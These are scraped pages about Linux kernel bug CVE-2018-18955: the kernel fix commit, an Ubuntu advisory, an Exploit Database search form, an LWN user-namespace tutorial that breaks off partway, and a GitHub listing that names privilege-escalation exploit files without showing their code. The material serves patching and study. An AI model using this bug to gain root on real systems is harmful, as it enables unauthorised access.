|  | [Proving Grounds](https://www.offsec.com/labs/) |
| [Shellcodes](/shellcodes) | [Exploit Statistics](/serchsploit) |  | [Proving Grounds](https://www.offsec.com/labs/) |
|  |  |  | [Penetration Testing Services](https://www.offsec.com/penetration-testing/) |

Close

##### Search The Exploit Database

×

Title

CVE

Type

dos

local

remote

shellcode

papers

webapps

Platform

AIX

ASP

BSD

BSD\_PPC

BSD\_x86

BSDi\_x86

CGI

FreeBSD

FreeBSD\_x86

FreeBSD\_x86-64

Generator

Hardware

HP-UX

IRIX

JSP

Linux

Linux\_MIPS

Linux\_PPC

Linux\_SPARC

Linux\_x86

Linux\_x86-64

MINIX

Multiple

NetBSD\_x86

Novell

OpenBSD

OpenBSD\_x86

OSX\_PPC

OSX

PHP

Plan9

QNX

SCO

SCO\_x86

Solaris

Solaris\_SPARC

Solaris\_x86

Tru64

ULTRIX

Unix

UnixWare

Windows\_x86

Windows\_x86-64

Windows

ARM

CFM

Netware

SuperH\_SH4

Java

BeOS

Immunix

Palm\_OS

AtheOS

iOS

Android

XML

Perl

Python

System\_z

JSON

ASHX

Ruby

ASPX

macOS

Linux\_CRISv32

eZine

Magazine

NodeJS

Alpha

Solaris\_MIPS

Lua

watchOS

VxWorks

Python2

Python3

TypeScript

Go

Author

Content

Port

14

21

22

23

25

42

49

53

66

69

70

79

80

81

102

105

110

111

113

119

123

135

139

143

161

162

164

383

389

402

406

411

443

444

445

446

502

504

513

514

515

532

548

554

555

617

623

631

655

689

783

787

808

873

888

901

998

1000

1040

1089

1099

1100

1114

1120

1194

1235

1471

1521

1533

1581

1589

1604

1617

1723

1743

1761

1812

1858

1861

1900

1947

2000

2022

2049

2100

2103

2121

2125

2181

2242

2315

2375

2380

2381

2401

2480

2525

2640

2810

2812

2947

2954

2990

3000

3030

3050

3052

3128

3129

3181

3200

3217

3306

3333

3378

3389

3460

3465

3500

3535

3632

3690

3790

3814

3817

4000

4002

4070

4081

4105

4111

4322

4343

4434

4444

4501

4555

4592

4661

4750

4848

5000

5060

5061

5080

5081

5093

5151

5180

5247

5250

5272

5308

5432

5466

5554

5555

5600

5655

5666

5800

5803

5814

5858

5900

5984

6066

6070

6080

6082

6101

6112

6129

6379

6502

6503

6660

6667

7001

7002

7070

7071

7080

7100

7144

7210

7272

7290

7426

7443

7510

7547

7649

7770

7777

7778

7787

7879

7902

8000

8001

8002

8004

8008

8020

8022

8023

8028

8030

8080

8081

8082

8088

8090

8181

8300

8400

8443

8445

8473

8500

8585

8619

8800

8812

8839

8880

8888

9000

9001

9002

9080

9090

9091

9100

9124

9200

9251

9256

9443

9447

9784

9788

9855

9876

9900

9987

9993

9999

10000

10001

10080

10202

10203

10443

10616

11000

11211

11460

12203

12221

12345

12397

12401

13327

13701

13722

13838

16992

18821

18881

19000

19810

19813

20000

20002

20010

20031

20111

20171

22003

23423

25672

26000

27015

27700

28015

30000

30303

31337

32400

32674

32764

34205

37215

37777

37848

38292

40007

41523

44334

46824

48080

49152

50000

50496

52311

52789

52869

52986

53413

54345

54890

55554

55555

56380

57772

58080

62514

Tag

WordPress Core

Metasploit Framework (MSF)

WordPress Plugin

SQL Injection (SQLi)

Cross-Site Scripting (XSS)

File Inclusion (LFI/RFI)

Cross-Site Request Forgery (CSRF)

Denial of Service (DoS)

Code Injection

Command Injection

Authentication Bypass / Credentials Bypass (AB/CB)

Client Side

Use After Free (UAF)

Out Of Bounds

Remote

Local

XML External Entity (XXE)

Integer Overflow

Server-Side Request Forgery (SSRF)

Race Condition

NULL Pointer Dereference

Malware

Buffer Overflow

Heap Overflow

Type Confusion

Object Injection

Bug Report

Console

Pwn2Own

Traversal

Deserialization

Verified

Has App

No Metasploit

Search



=== Content from git.kernel.org_6902086f_20250124_212942.html ===


| [cgit logo](/) | [index](/) : [kernel/git/torvalds/linux.git](/pub/scm/linux/kernel/git/torvalds/linux.git/) | for-next master |
| --- | --- | --- |
| Linux kernel source tree | Linus Torvalds |

| [about](/pub/scm/linux/kernel/git/torvalds/linux.git/about/)[summary](/pub/scm/linux/kernel/git/torvalds/linux.git/)[refs](/pub/scm/linux/kernel/git/torvalds/linux.git/refs/?id=d2f007dbe7e4c9583eea6eb04d60001e85c6f1bd)[log](/pub/scm/linux/kernel/git/torvalds/linux.git/log/)[tree](/pub/scm/linux/kernel/git/torvalds/linux.git/tree/?id=d2f007dbe7e4c9583eea6eb04d60001e85c6f1bd)[commit](/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=d2f007dbe7e4c9583eea6eb04d60001e85c6f1bd)[diff](/pub/scm/linux/kernel/git/torvalds/linux.git/diff/?id=d2f007dbe7e4c9583eea6eb04d60001e85c6f1bd)[stats](/pub/scm/linux/kernel/git/torvalds/linux.git/stats/) | log msg author committer range |
| --- | --- |

**diff options**

|  | |
| --- | --- |
| context: | 12345678910152025303540 |
| space: | includeignore |
| mode: | unifiedssdiffstat only |
|  |  |

| author | Jann Horn <jannh@google.com> | 2018-11-05 20:55:09 +0100 |
| --- | --- | --- |
| committer | Eric W. Biederman <ebiederm@xmission.com> | 2018-11-07 23:51:16 -0600 |
| commit | [d2f007dbe7e4c9583eea6eb04d60001e85c6f1bd](/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=d2f007dbe7e4c9583eea6eb04d60001e85c6f1bd) ([patch](/pub/scm/linux/kernel/git/torvalds/linux.git/patch/?id=d2f007dbe7e4c9583eea6eb04d60001e85c6f1bd)) | |
| tree | [9720c07318f1c5591dd3fb67a9bfdc80efc1f2da](/pub/scm/linux/kernel/git/torvalds/linux.git/tree/?id=d2f007dbe7e4c9583eea6eb04d60001e85c6f1bd) | |
| parent | [651022382c7f8da46cb4872a545ee1da6d097d2a](/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=651022382c7f8da46cb4872a545ee1da6d097d2a) ([diff](/pub/scm/linux/kernel/git/torvalds/linux.git/diff/?id=d2f007dbe7e4c9583eea6eb04d60001e85c6f1bd&id2=651022382c7f8da46cb4872a545ee1da6d097d2a)) | |
| download | [linux-d2f007dbe7e4c9583eea6eb04d60001e85c6f1bd.tar.gz](/pub/scm/linux/kernel/git/torvalds/linux.git/snapshot/linux-d2f007dbe7e4c9583eea6eb04d60001e85c6f1bd.tar.gz) | |

userns: also map extents in the reverse map to kernel IDsThe current logic first clones the extent array and sorts both copies, then
maps the lower IDs of the forward mapping into the lower namespace, but
doesn't map the lower IDs of the reverse mapping.
This means that code in a nested user namespace with >5 extents will see
incorrect IDs. It also breaks some access checks, like
inode\_owner\_or\_capable() and privileged\_wrt\_inode\_uidgid(), so a process
can incorrectly appear to be capable relative to an inode.
To fix it, we have to make sure that the "lower\_first" members of extents
in both arrays are translated; and we have to make sure that the reverse
map is sorted \*after\* the translation (since otherwise the translation can
break the sorting).
This is CVE-2018-18955.
Fixes: 6397fac4915a ("userns: bump idmap limits to 340")
Cc: stable@vger.kernel.org
Signed-off-by: Jann Horn <jannh@google.com>
Tested-by: Eric W. Biederman <ebiederm@xmission.com>
Reviewed-by: Eric W. Biederman <ebiederm@xmission.com>
Signed-off-by: Eric W. Biederman <ebiederm@xmission.com>
[Diffstat](/pub/scm/linux/kernel/git/torvalds/linux.git/diff/?id=d2f007dbe7e4c9583eea6eb04d60001e85c6f1bd)

| -rw-r--r-- | [kernel/user\_namespace.c](/pub/scm/linux/kernel/git/torvalds/linux.git/diff/kernel/user_namespace.c?id=d2f007dbe7e4c9583eea6eb04d60001e85c6f1bd) | 12 | |  |  |  | | --- | --- | --- | |
| --- | --- | --- | --- | --- | --- | --- |

1 files changed, 8 insertions, 4 deletions

| diff --git a/kernel/user\_namespace.c b/kernel/user\_namespace.cindex e5222b5fb4fe6c..923414a246e9e4 100644--- a/[kernel/user\_namespace.c](/pub/scm/linux/kernel/git/torvalds/linux.git/tree/kernel/user_namespace.c?id=651022382c7f8da46cb4872a545ee1da6d097d2a)+++ b/[kernel/user\_namespace.c](/pub/scm/linux/kernel/git/torvalds/linux.git/tree/kernel/user_namespace.c?id=d2f007dbe7e4c9583eea6eb04d60001e85c6f1bd)@@ -974,10 +974,6 @@ static ssize\_t map\_write(struct file \*file, const char \_\_user \*buf, if (!new\_idmap\_permitted(file, ns, cap\_setid, &new\_map)) goto out; - ret = sort\_idmaps(&new\_map);- if (ret < 0)- goto out;- ret = -EPERM; /\* Map the lower ids from the parent user namespace to the \* kernel global id space.@@ -1004,6 +1000,14 @@ static ssize\_t map\_write(struct file \*file, const char \_\_user \*buf, e->lower\_first = lower\_first; } + /\*+ \* If we want to use binary search for lookup, this clones the extent+ \* array and sorts both copies.+ \*/+ ret = sort\_idmaps(&new\_map);+ if (ret < 0)+ goto out;+ /\* Install the map \*/ if (new\_map.nr\_extents <= UID\_GID\_MAP\_MAX\_BASE\_EXTENTS) { memcpy(map->extent, new\_map.extent, |
| --- |

generated by [cgit 1.2.3-korg](https://git.zx2c4.com/cgit/about/) ([git 2.43.0](https://git-scm.com/)) at 2025-01-24 21:28:20 +0000



=== Content from github.com_98184b26_20250126_033832.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fbcoles%2Fkernel-exploits%2Ftree%2Fmaster%2FCVE-2018-18955)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fbcoles%2Fkernel-exploits%2Ftree%2Fmaster%2FCVE-2018-18955)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Ffiles%2Fdisambiguate&source=header-repo&source_repo=bcoles%2Fkernel-exploits)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[bcoles](/bcoles)
/
**[kernel-exploits](/bcoles/kernel-exploits)**
Public

* [Notifications](/login?return_to=%2Fbcoles%2Fkernel-exploits) You must be signed in to change notification settings
* [Fork
  237](/login?return_to=%2Fbcoles%2Fkernel-exploits)
* [Star
   759](/login?return_to=%2Fbcoles%2Fkernel-exploits)

* [Code](/bcoles/kernel-exploits)
* [Pull requests
  0](/bcoles/kernel-exploits/pulls)
* [Actions](/bcoles/kernel-exploits/actions)
* [Security](/bcoles/kernel-exploits/security)
* [Insights](/bcoles/kernel-exploits/pulse)

Additional navigation options

* [Code](/bcoles/kernel-exploits)
* [Pull requests](/bcoles/kernel-exploits/pulls)
* [Actions](/bcoles/kernel-exploits/actions)
* [Security](/bcoles/kernel-exploits/security)
* [Insights](/bcoles/kernel-exploits/pulse)

## Files

 master
## Breadcrumbs

1. [kernel-exploits](/bcoles/kernel-exploits/tree/master)
/
# CVE-2018-18955

/Copy path
## Directory actions

## More options

## Directory actions

## More options

## Latest commit

## History

[History](/bcoles/kernel-exploits/commits/master/CVE-2018-18955) master
## Breadcrumbs

1. [kernel-exploits](/bcoles/kernel-exploits/tree/master)
/
# CVE-2018-18955

/Top
## Folders and files

| Name | | Name | Last commit message | Last commit date |
| --- | --- | --- | --- | --- |
| parent directory[..](/bcoles/kernel-exploits/tree/master) | | |
| [exploit.bash\_completion.sh](/bcoles/kernel-exploits/blob/master/CVE-2018-18955/exploit.bash_completion.sh "exploit.bash_completion.sh") | | [exploit.bash\_completion.sh](/bcoles/kernel-exploits/blob/master/CVE-2018-18955/exploit.bash_completion.sh "exploit.bash_completion.sh") |  |  |
| [exploit.cron.sh](/bcoles/kernel-exploits/blob/master/CVE-2018-18955/exploit.cron.sh "exploit.cron.sh") | | [exploit.cron.sh](/bcoles/kernel-exploits/blob/master/CVE-2018-18955/exploit.cron.sh "exploit.cron.sh") |  |  |
| [exploit.dbus.sh](/bcoles/kernel-exploits/blob/master/CVE-2018-18955/exploit.dbus.sh "exploit.dbus.sh") | | [exploit.dbus.sh](/bcoles/kernel-exploits/blob/master/CVE-2018-18955/exploit.dbus.sh "exploit.dbus.sh") |  |  |
| [exploit.ldpreload.sh](/bcoles/kernel-exploits/blob/master/CVE-2018-18955/exploit.ldpreload.sh "exploit.ldpreload.sh") | | [exploit.ldpreload.sh](/bcoles/kernel-exploits/blob/master/CVE-2018-18955/exploit.ldpreload.sh "exploit.ldpreload.sh") |  |  |
| [exploit.polkit.sh](/bcoles/kernel-exploits/blob/master/CVE-2018-18955/exploit.polkit.sh "exploit.polkit.sh") | | [exploit.polkit.sh](/bcoles/kernel-exploits/blob/master/CVE-2018-18955/exploit.polkit.sh "exploit.polkit.sh") |  |  |
| [libsubuid.c](/bcoles/kernel-exploits/blob/master/CVE-2018-18955/libsubuid.c "libsubuid.c") | | [libsubuid.c](/bcoles/kernel-exploits/blob/master/CVE-2018-18955/libsubuid.c "libsubuid.c") |  |  |
| [rootshell.c](/bcoles/kernel-exploits/blob/master/CVE-2018-18955/rootshell.c "rootshell.c") | | [rootshell.c](/bcoles/kernel-exploits/blob/master/CVE-2018-18955/rootshell.c "rootshell.c") |  |  |
| [subshell.c](/bcoles/kernel-exploits/blob/master/CVE-2018-18955/subshell.c "subshell.c") | | [subshell.c](/bcoles/kernel-exploits/blob/master/CVE-2018-18955/subshell.c "subshell.c") |  |  |
| [subuid\_shell.c](/bcoles/kernel-exploits/blob/master/CVE-2018-18955/subuid_shell.c "subuid_shell.c") | | [subuid\_shell.c](/bcoles/kernel-exploits/blob/master/CVE-2018-18955/subuid_shell.c "subuid_shell.c") |  |  |
| View all files | | |

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from usn.ubuntu.com_f5caa2d6_20250124_213125.html ===


Your submission was sent successfully!
*Close*

Thank you for contacting us. A member of our team will be in touch shortly.
*Close*

You have successfully unsubscribed!
*Close*

Thank you for signing up for our newsletter!

In these regular emails you will find the latest updates about
Ubuntu and upcoming events where you can meet our team.*Close*

Your preferences have been successfully updated. *Close*

[Canonical Ubuntu](/)

* [Menu](/navigation)

* [Products](/navigation#products-navigation)
* [Use cases](/navigation#use-case-navigation)
* [Support](/navigation#support-navigation)
* [Community](/navigation#community-navigation)
* [Get Ubuntu](/navigation#get-ubuntu-navigation)

[![](https://assets.ubuntu.com/v1/82818827-CoF_white.svg)

Security](/security)

* [ESM](/security/esm)
* [Livepatch](/security/livepatch)
* [Certifications & Hardening](/security/compliance-automation)
* [CVEs](/security/cves)
* [Notices](/security/notices)
* [Docker Images](/security/docker-images)

# USN-3836-1: Linux kernel vulnerabilities

3 December 2018

Several security issues were fixed in the Linux kernel.

### Reduce your security exposure

Ubuntu Pro provides ten-year security coverage to 25,000+ packages in Main and Universe repositories, and it is free for up to five machines.

[Learn more about Ubuntu Pro](/pro)

## Releases

* [Ubuntu 18.04 ESM](/security/notices?release=bionic)

## Packages

* [linux](/security/cves?package=linux) - Linux kernel
* [linux-gcp](/security/cves?package=linux-gcp) - Linux kernel for Google Cloud Platform (GCP) systems
* [linux-kvm](/security/cves?package=linux-kvm) - Linux kernel for cloud environments
* [linux-raspi2](/security/cves?package=linux-raspi2) - Linux kernel for Raspberry Pi 2

## Details

Jann Horn discovered that the Linux kernel mishandles mapping UID or GID

ranges inside nested user namespaces in some situations. A local attacker

could use this to bypass access controls on resources outside the

namespace. ([CVE-2018-18955](/security/CVE-2018-18955))

Philipp Wendler discovered that the overlayfs implementation in the Linux

kernel did not properly verify the directory contents permissions from

within a unprivileged user namespace. A local attacker could use this to

expose sensitive information (protected file names). ([CVE-2018-6559](/security/CVE-2018-6559))

### Reduce your security exposure

Ubuntu Pro provides ten-year security coverage to 25,000+ packages in Main and Universe repositories, and it is free for up to five machines.

[Learn more about Ubuntu Pro](/pro)

## Update instructions

The problem can be corrected by updating your system to the following package versions:

##### Ubuntu 18.04

* [linux-image-4.15.0-1027-kvm](https://launchpad.net/ubuntu/%2Bsource/linux-kvm)
  -
  [4.15.0-1027.27](https://launchpad.net/ubuntu/%2Bsource/linux-kvm/4.15.0-1027.27)
* [linux-image-4.15.0-1029-raspi2](https://launchpad.net/ubuntu/%2Bsource/linux-raspi2)
  -
  [4.15.0-1029.31](https://launchpad.net/ubuntu/%2Bsource/linux-raspi2/4.15.0-1029.31)
* [linux-image-4.15.0-42-generic](https://launchpad.net/ubuntu/%2Bsource/linux)
  -
  [4.15.0-42.45](https://launchpad.net/ubuntu/%2Bsource/linux/4.15.0-42.45)
* [linux-image-4.15.0-42-generic-lpae](https://launchpad.net/ubuntu/%2Bsource/linux)
  -
  [4.15.0-42.45](https://launchpad.net/ubuntu/%2Bsource/linux/4.15.0-42.45)
* [linux-image-4.15.0-42-lowlatency](https://launchpad.net/ubuntu/%2Bsource/linux)
  -
  [4.15.0-42.45](https://launchpad.net/ubuntu/%2Bsource/linux/4.15.0-42.45)
* [linux-image-4.15.0-42-snapdragon](https://launchpad.net/ubuntu/%2Bsource/linux)
  -
  [4.15.0-42.45](https://launchpad.net/ubuntu/%2Bsource/linux/4.15.0-42.45)

After a standard system update you need to reboot your computer to make

all the necessary changes.

ATTENTION: Due to an unavoidable ABI change the kernel updates have

been given a new version number, which requires you to recompile and

reinstall all third party kernel modules you might have installed.

Unless you manually uninstalled the standard kernel metapackages

(e.g. linux-generic, linux-generic-lts-RELEASE, linux-virtual,

linux-powerpc), a standard system upgrade will automatically perform

this as well.

## References

* [CVE-2018-18955](/security/CVE-2018-18955)
* [CVE-2018-6559](/security/CVE-2018-6559)

## Related notices

* [USN-3835-1](/security/notices/USN-3835-1)
* [USN-3833-1](/security/notices/USN-3833-1)
* [USN-3836-2](/security/notices/USN-3836-2)
* [USN-3832-1](/security/notices/USN-3832-1)

### Join the discussion

* [Ubuntu security updates mailing list](https://lists.ubuntu.com/mailman/listinfo/ubuntu-hardened)
* [Security announcements mailing list](https://lists.ubuntu.com/mailman/listinfo/ubuntu-security-announce)

### Need help with your security needs?

Ubuntu Pro provides up to ten-year security coverage for over 23,000 open-source packages within the Ubuntu Main and Universe repositories.

[Talk to an expert to find out what would work best for you](/contact-us/form?product=pro)

### Further reading

* *Loading...*

---

## [OpenStack](/openstack) [OpenStack](/openstack)

* [What is OpenStack](/openstack/what-is-openstack)
* [Features](/openstack/features)
* [Managed](/openstack/managed)
* [Consulting](/openstack/consulting)
* [Install](/openstack/install)
* [Support](/openstack/support)

---

## [Ceph](/ceph) [Ceph](/ceph)

* [What is Ceph](/ceph/what-is-ceph)
* [Managed](/ceph/managed)
* [Consulting](/ceph/consulting)
* [Docs](/ceph/docs)
* [Install](/ceph/install)

---

## [Kubernetes](/kubernetes) [Kubernetes](/kubernetes)

* [What is Kubernetes](/kubernetes/what-is-kubernetes)
* [Charmed Kubernetes](/kubernetes/charmed-k8s)
* [Managed](/kubernetes/managed)
* [Install](/kubernetes/install)
* [Docs](/kubernetes/docs)
* [Resources](/kubernetes/resources)

---

## [Managed Services](/managed) [Managed Services](/managed)

* [OpenStack](/openstack/managed)
* [Kubernetes](/kubernetes/managed)
* [Ceph](/ceph/managed)
* [Apps](/managed/apps)
* [Observability](/observability/managed)
* [Firefighting](/managed/firefighting-support)

---

## [AI / ML](/ai) [AI / ML](/ai)

* [MLOps](/ai/mlops)
* [Kubeflow](/ai/what-is-kubeflow)
* [MLflow](/ai/mlflow)
* [Consulting](/ai/consulting)
* [Data Science](/ai/data-science)
* [MLOps workshop](/ai/mlops-workshop)

---

## [Robotics](/robotics) [Robotics](/robotics)

* [What is ROS](/robotics/what-is-ros)
* [ROS ESM](/robotics/ros-esm)
* [Community](/robotics/community)
* [Docs](/robotics/docs)

---

## [IoT](/internet-of-things) [IoT](/internet-of-things)

* [App store](/internet-of-things/appstore)
* [Embedded Linux](/embedded)
* [Management](/internet-of-things/management)

---

## [Ubuntu Core](/core) [Ubuntu Core](/core)

* [Features](/core/features)
* [Success stories](/core/stories)
* [Services](/core/services)
* [Docs](/core/docs)

---

## [Ubuntu Desktop](/desktop) [Ubuntu Desktop](/desktop)

* [Organisations](/desktop/organisations)
* [Developers](/desktop/developers)
* [Flavours](/desktop/flavours)
* [WSL](/desktop/wsl)

---

## [Ubuntu Server](/server) [Ubuntu Server](/server)

* [Hyperscale](/server/hyperscale)
* [Docs](/server/docs)

---

## [Cloud](/cloud) [Cloud](/cloud)

* [What is cloud computing](/cloud/cloud-computing)
* [What is private cloud](/cloud/private-cloud)
* [What is hybrid cloud](/cloud/hybrid-cloud)
* [What is multi-cloud](/cloud/multi-cloud)
* [Public cloud](/cloud/public-cloud)

---

## [Security](/security) [Security](/security)

* [ESM](/security/esm)
* [Livepatch](/security/livepatch)
* [Certifications & Hardening](/security/compliance-automation)
* [CVEs](/security/cves)
* [Notices](/security/notices)
* [Docker Images](/security/docker-images)

---

## [Landscape](/landscape) [Landscape](/landscape)

* [Features](/landscape/features)
* [Managed](/landscape/managed)
* [Compare](/landscape/compare)
* [Install](/landscape/docs/quickstart-deployment)
* [Docs](/landscape/docs)
* [Log in to Landscape](https://landscape.canonical.com/)

---

## [Containers](/containers) [Containers](/containers)

* [What are containers](/containers/what-are-containers)
* [Chiseled Ubuntu](/containers/chiseled)
* [Chiseled and .NET](/containers/chiseled/dotnet)

---

## [Downloads](/download) [Downloads](/download)

* [Desktop](/download/desktop)
* [Server](/download/server)
* [Core](/download/core)
* [Cloud](/download/cloud)

---

## [Support](/support) [Support](/support)

* [Your subscriptions](/pro/dashboard)
* [Account users](/pro/users)
* [Pricing](/pricing/pro)
* [Discourse](https://discourse.ubuntu.com/c/project/ubuntu-pro/116/)

---

## [Observability](/observability) [Observability](/observability)

* [What is observability](/observability/what-is-observability)
* [Managed](/observability/managed)

---

## [Pricing](/pricing) [Pricing](/pricing)

* [Consulting](/pricing/consulting)
* [Desktops](/pricing/desktop)
* [Devices](/pricing/devices)

---

## Solutions

* [AI](https://canonical.com/solutions/ai)
* [Data](https://canonical.com/data)
* [Infrastructure](https://canonical.com/solutions/infrastructure)
* [Secure open source](https://canonical.com/solutions/secure-open-source)

---

## Sectors

* [Automotive](/automotive)
* [Industrial](/industrial)
* [Government](/gov)
* [Telco](/telco)
* [Finance](/financial-services)

---

[Contact us](/contact-us)

* [About us](/about)
* [Community](/community)
* [Careers](https://www.canonical.com/careers)
* [Blog](/blog)
* [Resources](/engage)
* [Press centre](/blog/press-centre)

---

© 2025 Canonical Ltd.

Ubuntu and Canonical are registered trademarks of Canonical Ltd.

---

* [Legal information](/legal)
* [Data privacy](/legal/data-privacy)
* Manage your tracker settings
* [Report a bug on this site](https://github.com/canonical/ubuntu.com/issues/new?template=ISSUE_TEMPLATE.yaml)

Back to top

Go to the top of the page



=== Content from lwn.net_d258b0cf_20250126_033829.html ===


[![LWN.net Logo](https://static.lwn.net/images/logo/barepenguin-70.png)
LWN
.net
News from the source](/)
[![LWN](https://static.lwn.net/images/lcorner-ss.png)](/)

* [**Content**](#t)
  + [Weekly Edition](/current/)
  + [Archives](/Archives/)
  + [Search](/Search/)
  + [Kernel](/Kernel/)
  + [Security](/Security/)
  + [Events calendar](/Calendar/)
  + [Unread comments](/Comments/unread)
  + ---
  + [LWN FAQ](/op/FAQ.lwn)
  + [Write for us](/op/AuthorGuide.lwn)
* [**Edition**](#t)
  + [Return to the Development page](/Articles/539462/)

**User:**
**Password:**    |

 |

[**Subscribe**](/subscribe/) /
[**Log in**](/Login/) /
[**New account**](/Login/newaccount)

# Namespaces in operation, part 5: User namespaces

By **Michael Kerrisk**
February 27, 2013

Continuing our ongoing [series](/Articles/531114/#series_index) on namespaces, this
article looks more closely at user namespaces, a feature whose
implementation was (largely) completed in Linux 3.8. (The remaining work
consists of changes for [XFS](/Articles/538816/) and [a number of other filesystems](/Articles/538875/); the latter has
already been merged for 3.9.) User namespaces allow per-namespace mappings
of user and group IDs. This means that a process's user and group IDs
inside a user namespace can be different from its IDs outside of the
namespace. Most notably, a process can have a nonzero user ID outside a
namespace while at the same time having a user ID of zero inside the
namespace; in other words, the process is unprivileged for operations
outside the user namespace but has root privileges inside the namespace.
#### Creating user namespaces

User namespaces are created by specifying
the CLONE\_NEWUSER flag when
calling clone() or unshare(). Starting with Linux 3.8
(and unlike the flags used for creating other types of namespaces), no
privilege is required to create a user namespace. In our examples below,
all of the user namespaces are created using the unprivileged user ID 1000.

To begin investigating user namespaces, we'll make use of a small
program, [demo\_userns.c](/Articles/539941/), that
creates a child in a new user namespace. The child simply displays its
effective user and group IDs as well as its [capabilities](http://man7.org/linux/man-pages/man7/capabilities.7.html).
Running this program as an unprivileged user produces the following result:
```

    $ id -u          # Display effective user ID of shell process
    1000
    $ id -g          # Effective group ID of shell
    1000
    $ ./demo_userns
    eUID = 65534;  eGID = 65534;  capabilities: =ep

```

> **$ sudo subscribe today**
>
> Subscribe today and elevate your LWN privileges. You’ll have
> access to all of LWN’s high-quality articles as soon as they’re
> published, and help support LWN in the process. [Act now](https://lwn.net/Promo/nst-sudo/claim) and you can start with a free trial subscription.

The output from this program shows some interesting details. One of
these is the capabilities that were assigned to the child process. The
string "=ep" (produced by the library function
cap\_to\_text(), which converts capability sets to a textual
representation) indicates that the child has a full set of permitted and
effective capabilities, even though the program was run from an
unprivileged account. When a user namespace is created, the first process
in the namespace is granted a full set of capabilities in the namespace.
This allows that process to perform any initializations that are necessary
in the namespace before other processes are created in the namespace.

The second point of interest is the user and group IDs of the child
process. As noted above, a process's user and group IDs inside and outside
a user namespace can be different. However, there needs to be a mapping
from the user IDs inside a user namespace to a corresponding set of user
IDs outside the namespace; the same is true of group IDs. This allows the
system to perform the appropriate permission checks when a process in a
user namespace performs operations that affect the wider system (e.g.,
sending a signal to a process outside the namespace or accessing a file).

System calls that return process user and group IDs—for example,
getuid() and getgid()—always return credentials as
they appear inside the user namespace in which the calling process resides.
If a user ID has no mapping inside the namespace, then system calls that
return user IDs return the value defined in the file
/proc/sys/kernel/overflowuid, which on a standard system defaults
to the value 65534. Initially, a user namespace has no user ID mapping, so
all user IDs inside the namespace map to this value. Likewise, a new user
namespace has no mappings for group IDs, and all unmapped group IDs map to
/proc/sys/kernel/overflowgid (which has the same default as
overflowuid).

There is one other important point worth noting that can't be gleaned from
the output above. Although the new process has a full set of capabilities
in the new user namespace, it has no capabilities in the parent namespace.
This is true regardless of the credentials and capabilities of the process
that calls clone(). In particular, even if root employs
clone(CLONE\_NEWUSER), the resulting child process will have no
capabilities in the parent namespace.

One final point to be made about the creation of user namespaces is
that namespaces can be nested; that is, each user namespace (other than the
initial user namespace) has a parent user namespace, and can have zero or
more child user namespaces. The parent of a user namespace is the user
namespace of the process that creates the user namespace via a call to
clone() or unshare() with the CLONE\_NEWUSER
flag. The significance of the parent-child relationship between user
namespaces will become clearer in the remainder of this article.
#### Mapping user and group IDs

